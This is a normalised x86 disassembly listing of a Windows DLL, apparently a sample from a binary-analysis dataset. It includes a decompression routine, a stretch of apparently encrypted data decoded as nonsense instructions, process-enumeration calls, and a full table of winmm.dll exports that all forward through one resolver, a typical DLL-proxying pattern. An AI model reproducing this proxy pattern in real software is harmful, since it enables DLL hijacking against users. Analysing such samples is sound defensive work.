jae r-xdata
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
je r-xdata
mov ebp [ ebx * 4 + rw-data ]
mov ecx [ esi + 0x4 ]
mov esi [ esp + 0x14 ]
and ebp edx
add ebp ecx
mov ecx ebx
shr edx cl
mov ecx [ esp + 0x2c ]
sub eax ebx
sub esi ecx
mov [ esp + 0x14 ] esi
mov esi edi
sub esi ebp
mov ebp [ esp + 0x38 ]
mov ebx [ ebp + 0x28 ]
cmp esi ebx
jae r-xdata
mov ecx [ esp + 0x10 ]
dec ecx
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ ebp ]
mov ebp ecx
mov ecx eax
shl ebp cl
add eax 0x8
or edx ebp
mov ebp [ esp + 0x18 ]
inc ebp
cmp eax ebx
mov [ esp + 0x18 ] ebp
jb r-xdata
mov ecx [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov esi [ ecx + 0x4 ]
mov [ ecx + 0x18 ] rw-data
sub esi ebx
mov [ esp + 0x2c ] esi
mov esi eax
mov ebx [ esp + 0x2c ]
shr esi 0x3
cmp esi ebx
jb r-xdata
mov ecx [ ebx * 4 + rw-data ]
mov ebx [ esi + 0x4 ]
and ecx edx
add ecx ebx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
je r-xdata
mov ebx [ esp + 0x38 ]
sub ebp esi
mov [ ebx + 0x20 ] edx
lea edx [ esi * 8 ]
sub eax edx
mov edx ebp
mov [ ebx + 0x1c ] eax
mov eax [ esp + 0x10 ]
add esi eax
mov eax [ ecx + 0x8 ]
mov [ ecx + 0x4 ] esi
mov esi [ ecx ]
sub edx esi
mov [ ecx ] ebp
add eax edx
mov [ ecx + 0x8 ] eax
mov [ ebx + 0x34 ] edi
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
add esp 0x14
retn
mov esi [ esp + 0x2c ]
mov ebx [ esp + 0x38 ]
sub ebp ecx
mov [ ebx + 0x20 ] edx
lea edx [ ecx * 8 ]
sub eax edx
mov [ ebx + 0x1c ] eax
mov eax [ esp + 0x10 ]
mov edx [ esi ]
add ecx eax
mov eax [ esi + 0x8 ]
mov [ esi + 0x4 ] ecx
mov ecx ebp
mov [ esi ] ebp
sub ecx edx
add eax ecx
mov [ esi + 0x8 ] eax
mov [ ebx + 0x34 ] edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x14
retn
mov ecx ebx
mov bl [ esi ]
mov [ edi ] bl
mov bl [ esi + 0x1 ]
inc edi
inc esi
mov [ edi ] bl
inc edi
inc esi
sub ecx 0x2
mov ebp [ ebp + 0x2c ]
mov [ esp + 0x28 ] ebp
sub ebp ebx
jmp r-xdata
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ecx
jne r-xdata
mov ebp [ esp + 0x18 ]
jmp r-xdata
add esi ebp
cmp esi ebx
jb r-xdata
mov ebp [ esp + 0x28 ]
sub ebp esi
cmp ecx ebp
jbe r-xdata
cmp [ esp + 0x14 ] 0x102
jb r-xdata
mov bl [ esi ]
mov [ edi ] bl
mov bl [ esi + 0x1 ]
inc edi
inc esi
mov [ edi ] bl
inc edi
inc esi
sub ecx 0x2
sub ecx ebp
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ecx
jne r-xdata
mov ebp [ esp + 0x18 ]
jmp r-xdata
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ebp
jne r-xdata
mov esi [ esp + 0x38 ]
mov esi [ esi + 0x28 ]
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ecx
jne r-xdata
mov ebp [ esp + 0x18 ]
jmp r-xdata
sub_1000c5c0
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
push ebx
xor ebx ebx
cmp eax ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
push esi
push edi
push 0x1
push ebx
push ebx
push ebx
push 0xffffffff
mov esi 0x100
push [ ebp + 0x8 ]
push esi
push eax
call sub_10009150
mov edi eax
add esp 0x20
cmp edi ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
cmp [ eax ] bl
je r-xdata
push [ ebp - 0x4 ]
call sub_1000440b
mov eax [ ebp + 0x8 ]
pop ecx
pop edi
pop esi
push edi
call sub_100047df
cmp eax ebx
pop ecx
mov [ ebp - 0x4 ] eax
je r-xdata
pop ebx
leave
retn
mov cl [ edx ]
cmp cl 0x41
jl r-xdata
push 0x1
push ebx
push edi
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push esi
push [ rw-data ]
call sub_10009150
add esp 0x20
test eax eax
je r-xdata
inc edx
cmp [ edx ] bl
jne r-xdata
cmp cl 0x5a
jg r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_10008730
pop ecx
pop ecx
jmp r-xdata
add cl 0x20
mov [ edx ] cl
sub_10018f62
push esp
mov ah 0x2d
daa
dec edx
mov ebp 0x30e7a23b
lea esi [ ebx ]
jpo r-xdata
pop es
push esp
lodsd [ esi ]
cmp ecx [ edi - 0x6821c76a ]
clc
add [ edi ] 0xd2
xor ch [ edi ]
jecxz r-xdata
mov bl 0x22
das
and edx [ esi - 0xd6850d0 ]
pop ebp
daa
call 0x17e4c4e4
js r-xdata
add ch [ edi ]
xor [ ecx + edi - 0x79 ] 0x66
mov ch 0x2a
aas

xor esi [ edx + 0x31 ]
mov [ edi - 0x6 ] ss
dec ebp
pop ss
retn 0x3b81
pop ss
add eax 0x176d3b74
shl edi cl
xor [ ebp - 0x49188ec5 ] bh
in eax dx
pop ss
or al 0x74
xor eax 0x5ad16753
aaa
out dx al
xchg edi eax
cli
in eax dx
daa
dec ebx
test [ esi - 0x23f8edc4 ] dh
bound ebp [ edi ]
bound edx [ esi - 0x2198fdc4 ]
or bh [ edi ]

xor al 0x63
pop es
0x8234a69a 0xdc07
sub_10018fde
bound esp [ edi + 0x52 ]
xchg ecx eax
cmp edx ebp
mov al 0x73
pop es
push esp
lodsd [ esi ]
cmp ecx [ edi - 0x6821c76a ]
clc
add [ edi ] 0xd2
xor ch [ edi ]
jecxz r-xdata
add ch [ edi ]
xor [ ecx + edi - 0x79 ] 0x66
mov ch 0x2a
aas

xor esi [ edx + 0x31 ]
mov [ edi - 0x6 ] ss
dec ebp
pop ss
retn 0x3b81
sub_1001908f
mov al 0x52
pop es
fsubr [ ebp + 0x17 ]
and [ ebp + esi + 0x3d ] 0x3b81c617
adc [ esi - 0x4f ] ah
pop edx
aas
arpl [ ebp - 0xda891c8 ] dx
int 0x17
les eax [ ecx - 0x6b98bcc1 ]
je r-xdata
push edi
hlt
loop r-xdata
in eax dx
loopne r-xdata
cwde
jecxz r-xdata
cmp ebx [ ecx ]
bound ebp [ edi ]
ja r-xdata
mov ah 0x1d
pop ss
dec esp
mov eax [ 0x30954e3b ]
dec esp
push edi
jpe r-xdata
bound esi [ ecx ]
jg r-xdata
das
and [ edx + 0x31 ] 0x7f
push edi
push ss
xor ebp ecx
xchg edi eax
jpe r-xdata
mov dh 0x8d
daa
int 0x17
iretd
xor cl [ ebp - 0x3a8e1e9 ]
xor ebp [ ebp + 0x57 ]
bound esi [ ecx ]
popfd
push edi
clc
rcl [ ebx ] 0x1
div [ edx + 0x2f ]
and [ esi + 0x4d271231 ] dl
push edi
clc
push eax
push ds
daa
or dh [ ecx + edi + 0x47 ]
mov sp 0x722
pop eax
mov ebp 0x3296ea3b
lea edx [ edi ]
push ds
push edi
cld
jo r-xdata
nop
mov si 0x27ad
xor [ ebp + 0x57 ] ecx
mov esi 0x573c3962
inc ecx
xor esi [ ebx + 0x2f12d007 ]
aad 0xe7
mov edx 0x4de0174d
lea edi [ ebx ]
push esi
mov di 0x3f0a
iretd
sub_1001919b
or [ edx + 0x39 ] dh
and ah bh
cmp [ ebp + 0x3996833b ] bl
jb r-xdata
sbb eax 0x3896a517
mov esi 0x32963897
popfd
pop ss
add al 0x64
cmp ebp edx
dec eax
je r-xdata
cld
popfd
pop ss
call 0x193d4fc0
mov si 0x27cd
inc esp
popfd
cmp edx [ esi ]
out 0xbb eax
or eax 0x6da0b137
xchg esi eax
sbb [ edx + 0xf ] esi
std
sbb bh [ edi ]
mov esp [ edx + 0x39 ]
movsb [ edi ] [ esi ]
out 0xb6 eax
std
pop ss
rcl [ ecx + 0x5a67a23f ] 0xa1
xor ecx [ ebx - 0x33 ]
idiv [ ebp + 0x72ce3f4a ]
xor esi ecx
push edi
stc
add ch [ edi ]
into
mov [ ebx - 0x73bee833 ] cs
mov ecx ebp
pop ss
cli
push 0xffffff92
test al 0x62
xor [ ebp + 0x175df457 ] edi
inc edx
mov cl 0x33
lodsd [ esi ]
xchg edi eax
jpe r-xdata
cmp ebp edx
adc [ esi - 0x4e ] ah
int 0x27
punpckldq mm6 [ ecx ]
dec ebp
push edi
pop es
xchg esi eax
jb r-xdata
mov [ 0x3f729f07 ] eax
dec edx
aas
test al 0x95
int 0x27
or ah [ edx + 0x31 ]
push edi
jno r-xdata
mov esi 0x573c3962
jo r-xdata
xor [ ebp + 0x57 ] ecx
inc ecx
xor esi [ ebx + 0x2f12d007 ]
aad 0xe7
mov edx 0x4de0174d
lea edi [ ebx ]
push esi
mov di 0x3f0a
iretd
cmp al 0x18
sahf
xchg ebx eax
add edi esi
inc edx
inc ebx
out 0xb8 eax
jae r-xdata
je r-xdata
cmp edx [ eax ]
out 0xbc eax
adc esp [ edi - 0x41 ]
push edi
mul [ edx + 0x2f ]
dec ebp
xor eax 0xad26712
aas
or al [ ebx + 0x6a ]
xlat
or eax 0x74971c27
jge r-xdata
xchg ebp eax
xor al 0x12
pop es
cmp ecx [ ecx ]
add ah [ edi - 0x27 ]
push 0x3f
jae r-xdata
test al 0xf1
imul ecx [ edi ] 0x67
sar bh 0x39
into
mov eax [ 0xfffffffff887c05f ]
dec ebx
cmpsd [ esi ] [ edi ]
adc ch ch
out 0xe4 eax
xchg ebx eax
rcr [ edi + 0x15 ] 0x1
sub [ esi + 0x57c7bcac ] ecx
xchg ecx eax
jmp r-xdata
add eax 0xf61872ee
mov esp fs
mov [ eax - 0x70 ] esp
cwde
movsd [ edi ] [ esi ]
mov ecx [ ebp - 0x7fab1a46 ]
jge r-xdata
mov cl 0x3b
dec edx
xchg ebp eax
cmp al 0xc3
r-xdata
test [ ebx ] bh
mov bl 0x66
cmpsb [ esi ] [ edi ]
cmp edx [ edi ]
mov dl 0xbe
push cs
lea edi [ ebx + 0x183a5a77 ]
mov dh 0x5c
cmpsd [ esi ] [ edi ]
fadd [ edi ]
mov al 0x97
xchg ebx eax
out dx al
inc ebx
mov eax [ 0x4b3b0516 ]
dec eax
add dh [ ebp - 0x7666fc65 ]
int3
cmp ecx edx
mov si 0x27bd
xchg [ ebp - 0x2b3cf6c4 ] esi
outsd
add al 0x42
shl [ 0x18a864e3 ] cl
fidivr [ ecx + 0x4e ]
pop esi
fwait
jb r-xdata
mov edi 0x271df497
loopne r-xdata
add ah [ edi - 0x22 ]
xor ch [ edi ]
mov al 0xe7
mov al 0x32
push ds
je r-xdata
cmp [ edi - 0x47 ] esp
hlt
mov [ edi - 0x34 ] esp
and al 0x53
cdq
sti
pop ss
cmpsd [ esi ] [ edi ]
or [ ebx + 0x2cdea81c ] dh
fisubr [ eax - 0x6d ]
inc esi
call 0xffffffffae97cc27
cld
outsd
0xf64eafd8 0x89bb
add [ 0xffffffff8aaf875b ] 0x9a
mov [ 0x3c9d7f7b ] edx
sbb [ esi + 0x42f70193 ] bl
shl [ esi - 0x42 ] 0x1
mov ebp 0x3cb58727
or ebx eax
aam 0x6f
sub_1001e08d
add dl [ edx + 0x6c ]
sqrtps xmm5 [ ebx + 0x18 ]
add al 0x6a
push 0x21a7578c
test al 0xa4
cdq
jns r-xdata
inc edx
nop
pop es
jg r-xdata
or al 0x21
add ecx [ eax + ebx * 2 + 0x57 ]
push 0x6ac90fe5
fprem
or [ 0x13c007a3 ] esi
and al 0xa7
aas
jns r-xdata
jl r-xdata
in al dx
pushfd
rcr al 0xc6
clc
clc
fdiv [ edi + 0x44 ]
rol [ esi - 0xc835f8a ] 0x8
0x20102331 0x96d0
shl edi 0x1
inc ecx
movsd [ edi ] [ esi ]
0xd6d9
js r-xdata
lahf
lahf
inc ebx
pop eax
push ds
dec eax
popfd
add [ eax + 0x48 ] eax
add edx [ eax ]
or [ edx + 0x20102331 ] bl
rcl [ esi - 0x5abe082f ] 0x1
ja r-xdata
pcmpgtd mm6 [ ebx - 0x793f0477 ]
jbe r-xdata
inc esp
xchg [ eax ] dh
psrlw mm3 mmx0
push edx
inc esp
inc eax
mov ecx 0x9dd18e51
pushfd
lodsb [ esi ]
push ebx
dec edi
or eax edx
0x49eb1afd 0x1878
enter 0x8efd 0x4f
pushad
or [ 0xffffffff8e0df4ea ] al
and dh cl
xor [ eax ] cl
adc ch dl
sub_1003ac47
int 0x98
adc al 0x5f
dec eax
neg dl
inc eax
mov esp 0xb26384b
dec ebx
out 0xce eax
adc esi [ eax + 0x59 ]
cdq
fcmovnbe st2
lodsb [ esi ]
rol [ ebx - 0x79477e58 ] 0x1
mov eax 0xf8e9f8a8
in al 0xf8
sar ah 0xa0
retn 0x98b1
sub_10001000
push esi
mov esi [ esp + 0x8 ]
push esi
call [ GetModuleHandleA@IAT ]
test eax eax
jne r-xdata
pop esi
retn
push esi
call [ LoadLibraryA@IAT ]
ordinal_2
push 0x2
call sub_10002290
jmp eax
CloseDriver
push rw-data
call sub_10002290
jmp eax
DefDriverProc
push rw-data
call sub_10002290
jmp eax
DriverCallback
push rw-data
call sub_10002290
jmp eax
DrvGetModuleHandle
push rw-data
call sub_10002290
jmp eax
GetDriverModuleHandle
push rw-data
call sub_10002290
jmp eax
MigrateAllDrivers
push rw-data
call sub_10002290
jmp eax
MigrateSoundEvents
push rw-data
call sub_10002290
jmp eax
NotifyCallbackData
push rw-data
call sub_10002290
jmp eax
OpenDriver
push rw-data
call sub_10002290
jmp eax
PlaySound
push rw-data
call sub_10002290
jmp eax
PlaySoundA
push rw-data
call sub_10002290
jmp eax
PlaySoundW
push rw-data
call sub_10002290
jmp eax
SendDriverMessage
push rw-data
call sub_10002290
jmp eax
WOW32DriverCallback
push rw-data
call sub_10002290
jmp eax
WOW32ResolveMultiMediaHandle
push rw-data
call sub_10002290
jmp eax
WOWAppExit
push rw-data
call sub_10002290
jmp eax
WinmmLogoff
push rw-data
call sub_10002290
jmp eax
WinmmLogon
push rw-data
call sub_10002290
jmp eax
aux32Message
push rw-data
call sub_10002290
jmp eax
auxGetDevCapsA
push rw-data
call sub_10002290
jmp eax
auxGetDevCapsW
push rw-data
call sub_10002290
jmp eax
auxGetNumDevs
push rw-data
call sub_10002290
jmp eax
auxGetVolume
push rw-data
call sub_10002290
jmp eax
auxOutMessage
push rw-data
call sub_10002290
jmp eax
auxSetVolume
push rw-data
call sub_10002290
jmp eax
gfxAddGfx
push rw-data
call sub_10002290
jmp eax
gfxBatchChange
push rw-data
call sub_10002290
jmp eax
gfxCreateGfxFactoriesList
push rw-data
call sub_10002290
jmp eax
gfxCreateZoneFactoriesList
push rw-data
call sub_10002290
jmp eax
gfxDestroyDeviceInterfaceList
push rw-data
call sub_10002290
jmp eax
gfxEnumerateGfxs
push rw-data
call sub_10002290
jmp eax
_gfxLogoff@0
push rw-data
call sub_10002290
jmp eax
_gfxLogon@4
push rw-data
call sub_10002290
jmp eax
gfxModifyGfx
push rw-data
call sub_10002290
jmp eax
gfxOpenGfx
push rw-data
call sub_10002290
jmp eax
gfxRemoveGfx
push rw-data
call sub_10002290
jmp eax
joy32Message
push rw-data
call sub_10002290
jmp eax
joyConfigChanged
push rw-data
call sub_10002290
jmp eax
joyGetDevCapsA
push rw-data
call sub_10002290
jmp eax
joyGetDevCapsW
push rw-data
call sub_10002290
jmp eax
joyGetNumDevs
push rw-data
call sub_10002290
jmp eax
joyGetPos
push rw-data
call sub_10002290
jmp eax
joyGetPosEx
push rw-data
call sub_10002290
jmp eax
joyGetThreshold
push rw-data
call sub_10002290
jmp eax
joyReleaseCapture
push rw-data
call sub_10002290
jmp eax
joySetCapture
push rw-data
call sub_10002290
jmp eax
joySetThreshold
push rw-data
call sub_10002290
jmp eax
mci32Message
push rw-data
call sub_10002290
jmp eax
mciDriverNotify
push rw-data
call sub_10002290
jmp eax
mciDriverYield
push rw-data
call sub_10002290
jmp eax
mciExecute
push rw-data
call sub_10002290
jmp eax
mciFreeCommandResource
push rw-data
call sub_10002290
jmp eax
mciGetCreatorTask
push rw-data
call sub_10002290
jmp eax
mciGetDeviceIDA
push rw-data
call sub_10002290
jmp eax
mciGetDeviceIDFromElementIDA
push rw-data
call sub_10002290
jmp eax
mciGetDeviceIDFromElementIDW
push rw-data
call sub_10002290
jmp eax
mciGetDeviceIDW
push rw-data
call sub_10002290
jmp eax
mciGetDriverData
push rw-data
call sub_10002290
jmp eax
mciGetErrorStringA
push rw-data
call sub_10002290
jmp eax
mciGetErrorStringW
push rw-data
call sub_10002290
jmp eax
mciGetYieldProc
push rw-data
call sub_10002290
jmp eax
mciLoadCommandResource
push rw-data
call sub_10002290
jmp eax
mciSendCommandA
push rw-data
call sub_10002290
jmp eax
mciSendCommandW
push rw-data
call sub_10002290
jmp eax
mciSendStringA
push rw-data
call sub_10002290
jmp eax
mciSendStringW
push rw-data
call sub_10002290
jmp eax
mciSetDriverData
push rw-data
call sub_10002290
jmp eax
mciSetYieldProc
push rw-data
call sub_10002290
jmp eax
mid32Message
push rw-data
call sub_10002290
jmp eax
midiConnect
push rw-data
call sub_10002290
jmp eax
midiDisconnect
push rw-data
call sub_10002290
jmp eax
midiInAddBuffer
push rw-data
call sub_10002290
jmp eax
midiInClose
push rw-data
call sub_10002290
jmp eax
midiInGetDevCapsA
push rw-data
call sub_10002290
jmp eax
midiInGetDevCapsW
push rw-data
call sub_10002290
jmp eax
midiInGetErrorTextA
push rw-data
call sub_10002290
jmp eax
midiInGetErrorTextW
push rw-data
call sub_10002290
jmp eax
midiInGetID
push rw-data
call sub_10002290
jmp eax
midiInGetNumDevs
push rw-data
call sub_10002290
jmp eax
midiInMessage
push rw-data
call sub_10002290
jmp eax
midiInOpen
push rw-data
call sub_10002290
jmp eax
midiInPrepareHeader
push rw-data
call sub_10002290
jmp eax
midiInReset
push rw-data
call sub_10002290
jmp eax
midiInStart
push rw-data
call sub_10002290
jmp eax
midiInStop
push rw-data
call sub_10002290
jmp eax
midiInUnprepareHeader
push rw-data
call sub_10002290
jmp eax
midiOutCacheDrumPatches
push rw-data
call sub_10002290
jmp eax
midiOutCachePatches
push rw-data
call sub_10002290
jmp eax
midiOutClose
push rw-data
call sub_10002290
jmp eax
midiOutGetDevCapsA
push rw-data
call sub_10002290
jmp eax
midiOutGetDevCapsW
push rw-data
call sub_10002290
jmp eax
midiOutGetErrorTextA
push rw-data
call sub_10002290
jmp eax
midiOutGetErrorTextW
push rw-data
call sub_10002290
jmp eax
midiOutGetID
push rw-data
call sub_10002290
jmp eax
midiOutGetNumDevs
push rw-data
call sub_10002290
jmp eax
midiOutGetVolume
push rw-data
call sub_10002290
jmp eax
midiOutLongMsg
push rw-data
call sub_10002290
jmp eax
midiOutMessage
push rw-data
call sub_10002290
jmp eax
midiOutOpen
push rw-data
call sub_10002290
jmp eax
midiOutPrepareHeader
push rw-data
call sub_10002290
jmp eax
midiOutReset
push rw-data
call sub_10002290
jmp eax
midiOutSetVolume
push rw-data
call sub_10002290
jmp eax
midiOutShortMsg
push rw-data
call sub_10002290
jmp eax
midiOutUnprepareHeader
push rw-data
call sub_10002290
jmp eax
midiStreamClose
push rw-data
call sub_10002290
jmp eax
midiStreamOpen
push rw-data
call sub_10002290
jmp eax
midiStreamOut
push rw-data
call sub_10002290
jmp eax
midiStreamPause
push rw-data
call sub_10002290
jmp eax
midiStreamPosition
push rw-data
call sub_10002290
jmp eax
midiStreamProperty
push rw-data
call sub_10002290
jmp eax
midiStreamRestart
push rw-data
call sub_10002290
jmp eax
midiStreamStop
push rw-data
call sub_10002290
jmp eax
mixerClose
push rw-data
call sub_10002290
jmp eax
mixerGetControlDetailsA
push rw-data
call sub_10002290
jmp eax
mixerGetControlDetailsW
push rw-data
call sub_10002290
jmp eax
mixerGetDevCapsA
push rw-data
call sub_10002290
jmp eax
mixerGetDevCapsW
push rw-data
call sub_10002290
jmp eax
mixerGetID
push rw-data
call sub_10002290
jmp eax
mixerGetLineControlsA
push rw-data
call sub_10002290
jmp eax
mixerGetLineControlsW
push rw-data
call sub_10002290
jmp eax
mixerGetLineInfoA
push rw-data
call sub_10002290
jmp eax
mixerGetLineInfoW
push rw-data
call sub_10002290
jmp eax
mixerGetNumDevs
push rw-data
call sub_10002290
jmp eax
mixerMessage
push rw-data
call sub_10002290
jmp eax
mixerOpen
push rw-data
call sub_10002290
jmp eax
mixerSetControlDetails
push rw-data
call sub_10002290
jmp eax
mmDrvInstall
push rw-data
call sub_10002290
jmp eax
mmGetCurrentTask
push rw-data
call sub_10002290
jmp eax
mmTaskBlock
push rw-data
call sub_10002290
jmp eax
mmTaskCreate
push rw-data
call sub_10002290
jmp eax
mmTaskSignal
push rw-data
call sub_10002290
jmp eax
mmTaskYield
push rw-data
call sub_10002290
jmp eax
mmioAdvance
push rw-data
call sub_10002290
jmp eax
mmioAscend
push rw-data
call sub_10002290
jmp eax
mmioClose
push rw-data
call sub_10002290
jmp eax
mmioCreateChunk
push rw-data
call sub_10002290
jmp eax
mmioDescend
push rw-data
call sub_10002290
jmp eax
mmioFlush
push rw-data
call sub_10002290
jmp eax
mmioGetInfo
push rw-data
call sub_10002290
jmp eax
mmioInstallIOProcA
push rw-data
call sub_10002290
jmp eax
mmioInstallIOProcW
push rw-data
call sub_10002290
jmp eax
mmioOpenA
push rw-data
call sub_10002290
jmp eax
mmioOpenW
push rw-data
call sub_10002290
jmp eax
mmioRead
push rw-data
call sub_10002290
jmp eax
mmioRenameA
push rw-data
call sub_10002290
jmp eax
mmioRenameW
push rw-data
call sub_10002290
jmp eax
mmioSeek
push rw-data
call sub_10002290
jmp eax
mmioSendMessage
push rw-data
call sub_10002290
jmp eax
mmioSetBuffer
push rw-data
call sub_10002290
jmp eax
mmioSetInfo
push rw-data
call sub_10002290
jmp eax
mmioStringToFOURCCA
push rw-data
call sub_10002290
jmp eax
mmioStringToFOURCCW
push rw-data
call sub_10002290
jmp eax
mmioWrite
push rw-data
call sub_10002290
jmp eax
mmsystemGetVersion
push rw-data
call sub_10002290
jmp eax
mod32Message
push rw-data
call sub_10002290
jmp eax
mxd32Message
push rw-data
call sub_10002290
jmp eax
sndPlaySoundA
push rw-data
call sub_10002290
jmp eax
sndPlaySoundW
push rw-data
call sub_10002290
jmp eax
tid32Message
push rw-data
call sub_10002290
jmp eax
timeBeginPeriod
push rw-data
call sub_10002290
jmp eax
timeEndPeriod
push rw-data
call sub_10002290
jmp eax
timeGetDevCaps
push rw-data
call sub_10002290
jmp eax
timeGetSystemTime
push rw-data
call sub_10002290
jmp eax
timeGetTime
push rw-data
call sub_10002290
jmp eax
timeKillEvent
push rw-data
call sub_10002290
jmp eax
timeSetEvent
push rw-data
call sub_10002290
jmp eax
waveInAddBuffer
push rw-data
call sub_10002290
jmp eax
waveInClose
push rw-data
call sub_10002290
jmp eax
waveInGetDevCapsA
push rw-data
call sub_10002290
jmp eax
waveInGetDevCapsW
push rw-data
call sub_10002290
jmp eax
waveInGetErrorTextA
push rw-data
call sub_10002290
jmp eax
waveInGetErrorTextW
push rw-data
call sub_10002290
jmp eax
waveInGetID
push rw-data
call sub_10002290
jmp eax
waveInGetNumDevs
push rw-data
call sub_10002290
jmp eax
waveInGetPosition
push rw-data
call sub_10002290
jmp eax
waveInMessage
push rw-data
call sub_10002290
jmp eax
waveInOpen
push rw-data
call sub_10002290
jmp eax
waveInPrepareHeader
push rw-data
call sub_10002290
jmp eax
waveInReset
push rw-data
call sub_10002290
jmp eax
waveInStart
push rw-data
call sub_10002290
jmp eax
waveInStop
push rw-data
call sub_10002290
jmp eax
waveInUnprepareHeader
push rw-data
call sub_10002290
jmp eax
waveOutBreakLoop
push rw-data
call sub_10002290
jmp eax
waveOutClose
push rw-data
call sub_10002290
jmp eax
waveOutGetDevCapsA
push rw-data
call sub_10002290
jmp eax
waveOutGetDevCapsW
push rw-data
call sub_10002290
jmp eax
waveOutGetErrorTextA
push rw-data
call sub_10002290
jmp eax
waveOutGetErrorTextW
push rw-data
call sub_10002290
jmp eax
waveOutGetID
push rw-data
call sub_10002290
jmp eax
waveOutGetNumDevs
push rw-data
call sub_10002290
jmp eax
waveOutGetPitch
push rw-data
call sub_10002290
jmp eax
waveOutGetPlaybackRate
push rw-data
call sub_10002290
jmp eax
waveOutGetPosition
push rw-data
call sub_10002290
jmp eax
waveOutGetVolume
push rw-data
call sub_10002290
jmp eax
waveOutMessage
push rw-data
call sub_10002290
jmp eax
waveOutOpen
push rw-data
call sub_10002290
jmp eax
waveOutPause
push rw-data
call sub_10002290
jmp eax
waveOutPrepareHeader
push rw-data
call sub_10002290
jmp eax
waveOutReset
push rw-data
call sub_10002290
jmp eax
waveOutRestart
push rw-data
call sub_10002290
jmp eax
waveOutSetPitch
push rw-data
call sub_10002290
jmp eax
waveOutSetPlaybackRate
push rw-data
call sub_10002290
jmp eax
waveOutSetVolume
push rw-data
call sub_10002290
jmp eax
waveOutUnprepareHeader
push rw-data
call sub_10002290
jmp eax
waveOutWrite
push rw-data
call sub_10002290
jmp eax
wid32Message
push rw-data
call sub_10002290
jmp eax
winmmDbgOut
push rw-data
call sub_10002290
jmp eax
winmmSetDebugLevel
push rw-data
call sub_10002290
jmp eax
wod32Message
push rw-data
call sub_10002290
jmp eax
sub_10003410
mov eax [ esp + 0x4 ]
push eax
call [ GetFileAttributesA@IAT ]
xor ecx ecx
cmp eax 0xffffffff
setne cl
mov eax ecx
retn
sub_10003640
push 0x0
push 0x2
call CreateToolhelp32Snapshot
retn
sub_10003740
mov eax [ esp + 0x4 ]
push eax
call sub_10003650
add esp 0x4
retn
sub_100037a0
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x400 ]
cmp eax 0x186a0
jb r-xdata
xor eax eax
retn 0x4
cmp [ eax ] 0x0
je r-xdata
push ecx
call eax
sub_100040ce
push 0x1
push [ esp + 0x8 ]
call sub_100047f1
pop ecx
pop ecx
retn
sub_10004267
push 0x9
call sub_10005c23
pop ecx
retn
sub_100043b5
push 0x9
call sub_10005c23
pop ecx
xor edi edi
retn
sub_10004475
push 0x9
call sub_10005c23
pop ecx
retn
sub_100044cd
push 0x9
call sub_10005c23
pop ecx
retn
sub_100044f4
push [ esp + 0x4 ]
call sub_1000440b
pop ecx
retn
sub_10004884
push 0x9
call sub_10005c23
pop ecx
retn
sub_100048e3
push 0x9
call sub_10005c23
pop ecx
retn
sub_10005b2d
push esi
mov esi [ InitializeCriticalSection@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
retn
sub_10005c23
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 4 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10006228
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_100062b2
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_10006228
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_100062de
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_100063bd
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_1000624a
add esp 0x8
pop ebp
retn 0x4
sub_10006db1
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_10006dbe
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_10006dce
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_10006eac
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_10006fb0
push rw-data
push rw-data
call sub_10006fb0
add esp 0x10
retn
call eax
sub_10006ed9
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_10006ef9
add esp 0xc
retn
sub_10006eea
push 0x1
push 0x0
push 0x0
call sub_10006ef9
add esp 0xc
retn
sub_10006f9e
push 0xd
call sub_10005bc2
pop ecx
retn
sub_10006fa7
push 0xd
call sub_10005c23
pop ecx
retn
sub_1000701e
call sub_10005b56
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_1000703c
mov eax [ esp + 0x4 ]
mov [ eax + 0x50 ] rw-data
mov [ eax + 0x14 ] 0x1
retn
sub_10007cc8
push 0x0
push [ esp + 0x10 ]
